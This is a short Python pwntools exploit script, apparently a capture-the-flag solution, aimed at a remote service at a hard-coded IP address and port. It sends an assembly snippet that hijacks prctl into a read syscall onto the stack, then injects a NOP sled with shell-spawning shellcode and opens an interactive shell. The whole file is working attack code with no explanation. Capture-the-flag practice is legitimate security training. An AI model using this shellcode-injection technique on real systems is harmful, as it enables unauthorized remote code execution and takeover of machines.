from pwn import *
import time, sys
from binascii import *

context.binary = "./main"
p = remote("35.198.105.104", "26739")
p.recvuntil("x86-64> ")

payload = ''
payload += ".global prctl;prctl:mov $0,%ax;mov $0,%di;mov %rsp,%rsi;pop %dx;syscall;jmp %rsp"
print "[+] len : ", len(payload)

p.sendline(payload)
'''
for i in xrange(10):
    leak = u64(p.recv(8))
    print hex(leak)
'''
p.sendline("\x90" * 20 + asm(shellcraft.sh()))

p.interactive()
